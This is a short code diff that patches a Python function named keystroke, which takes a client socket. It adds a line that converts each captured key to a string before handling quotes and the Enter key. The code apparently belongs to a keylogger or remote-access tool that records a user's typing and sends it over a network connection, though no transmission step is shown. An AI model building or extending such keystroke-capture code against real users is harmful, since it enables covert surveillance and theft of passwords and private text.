@@ -189,6 +189,7 @@ def keystroke(Client_socket):
 		nonlocal unhook
 		nonlocal text
 		if not unhook:
+			key = str(key)
 			key = key.replace("'","")
 			if key == "Key.enter":
 				key = "\n"
